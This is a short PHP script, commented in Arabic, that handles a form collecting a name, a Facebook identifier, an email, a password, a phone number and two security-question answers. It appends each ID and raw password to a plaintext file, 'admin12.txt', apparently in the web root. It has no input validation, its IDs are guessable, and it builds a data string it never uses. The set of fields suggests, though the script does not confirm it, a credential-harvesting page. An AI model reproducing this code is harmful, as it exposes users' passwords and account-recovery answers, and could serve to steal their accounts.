<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // استلام البيانات من النموذج
    $fullName = $_POST['fullName'];
    $facebook = $_POST['facebook'];
    $email = $_POST['email'];
    $password = $_POST['password'];
    $phone = $_POST['phone'];
    $q1 = $_POST['q1'];
    $q2 = $_POST['q2'];

    // توليد رقم إشاري فريد
    $idNumber = rand(100000, 999999); // رقم عشوائي بين 100000 و 999999

    // تنسيق البيانات لتخزينها
    $data = "الرقم الإشاري: $idNumber\n";
    $data .= "الاسم الكامل: $fullName\n";
    $data .= "فيس بوك: $facebook\n";
    $data .= "البريد الإلكتروني: $email\n";
    $data .= "كلمة المرور: $password\n";
    $data .= "رقم الهاتف: $phone\n";
    $data .= "إجابة السؤال الأول: $q1\n";
    $data .= "إجابة السؤال الثاني: $q2\n";
    $data .= "-----------------------------\n";

    // تخزين البيانات في ملف نصي
    $file = 'admin12.txt';
    file_put_contents($file, "$idNumber,$password\n", FILE_APPEND); // تخزين الرقم الإشاري وكلمة المرور للتحقق

    // إعادة توجيه المستخدم إلى صفحة النجاح مع الرقم الإشاري والاسم
    header("Location: success.php?name=" . urlencode($fullName) . "&idNumber=" . $idNumber);
    exit();
}
?>